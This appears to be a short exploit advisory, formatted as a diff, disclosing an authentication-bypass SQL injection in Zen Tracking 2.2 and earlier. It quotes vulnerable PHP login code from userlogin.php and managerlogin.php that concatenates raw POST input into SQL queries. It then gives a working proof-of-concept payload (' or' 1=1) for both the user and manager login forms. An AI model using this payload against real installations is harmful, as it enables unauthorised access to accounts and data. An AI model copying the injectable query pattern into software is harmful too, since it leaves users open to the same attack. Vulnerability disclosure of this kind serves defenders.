@@ -1,0 +1,40 @@
+[+] Zen Tracking <= 2.2 (Auth Bypass) SQL Injection Vulnerability
+[+] Discovered by cr4wl3r <cr4wl3r[!]linuxmail.org>
+[+] Download : http://scripts.ringsworld.com/calendars/zentimetracking/
+
+[+] Vuln Code : 
+
+[userlogin.php]
+
+if (!empty($_POST['password']))
+{
+   $username =$_POST['username'];
+   $password =$_POST['password'];
+   dbConnect();
+   $result1 = mysql_query("select * from ".$tbluser." where username='". $username ."' and password='". $password ."'".  mysql_error());
+
+[+] PoC :
+
+[ZenTracking_path]/userlogin.php
+
+username: ' or' 1=1
+Password: ' or' 1=1
+
+
+[+] Vuln Code : 
+
+[managerlogin.php]
+
+if (!empty($_POST['password']))
+{
+   $username =$_POST['username'];
+   $password =$_POST['password'];
+   dbConnect();
+   $result1 = mysql_query("select * from ".$tblmanager." where username='". $username ."' and password='". $password ."'".  mysql_error());
+
+[+] PoC :
+
+[ZenTracking_path]/managerlogin.php
+
+username: ' or' 1=1
+Password: ' or' 1=1
